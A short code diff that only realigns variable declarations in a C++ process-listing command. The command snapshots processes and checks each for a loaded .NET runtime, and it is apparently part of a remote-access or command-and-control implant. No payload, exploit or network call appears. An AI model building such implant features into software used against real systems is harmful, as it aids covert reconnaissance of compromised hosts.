@@ -138,17 +138,18 @@ namespace Commands {
         _stream *out = Stream::CreateStreamWithHeaders(TypeResponse);
         Stream::PackDword(out, PROCESSLIST);
 
-        PROCESSENTRY32 entries      = { };
-        HANDLE snapshot             = { };
-        HANDLE process              = { };
+        PROCESSENTRY32  entries     = { };
+        HANDLE          snapshot    = { };
+        HANDLE          process     = { };
 
-        IEnumUnknown *enums         = { };
-        ICLRMetaHost *meta          = { };
+        IEnumUnknown    *enums      = { };
+        ICLRMetaHost    *meta       = { };
         ICLRRuntimeInfo *runtime    = { };
 
-        WCHAR buffer[1024];
-        DWORD Size  = 0;
         DWORD Type  = Parser::UnpackDword(parser); // listing managed/un-managed processes
+        DWORD Size  = 0;
+
+        WCHAR buffer[1024];
 
         Size            = ARRAY_LEN(buffer);
         entries.dwSize  = sizeof(PROCESSENTRY32);
@@ -160,8 +161,8 @@ namespace Commands {
             BOOL is_managed  = FALSE;
             BOOL is_loaded   = FALSE;
 
-            CLIENT_ID cid           = { };
-            OBJECT_ATTRIBUTES attr  = { };
+            CLIENT_ID           cid     = { };
+            OBJECT_ATTRIBUTES   attr    = { };
 
             cid.UniqueThread    = nullptr;
             cid.UniqueProcess   = R_CAST(HANDLE, entries.th32ProcessID);
